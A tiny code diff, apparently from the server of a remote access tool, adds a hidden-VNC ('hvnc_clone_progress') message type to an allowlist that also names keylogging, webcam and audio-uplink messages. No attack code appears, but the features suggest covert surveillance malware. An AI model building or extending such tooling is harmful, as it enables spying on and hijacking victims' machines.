@@ -27,6 +27,7 @@ export const ALLOWED_CLIENT_MESSAGE_TYPES = new Set([
   "keylog_delete_result",
   "voice_uplink",
   "webcam_devices",
+  "hvnc_clone_progress",
 ]);
 
 export function isAllowedClientMessageType(type: string): boolean {
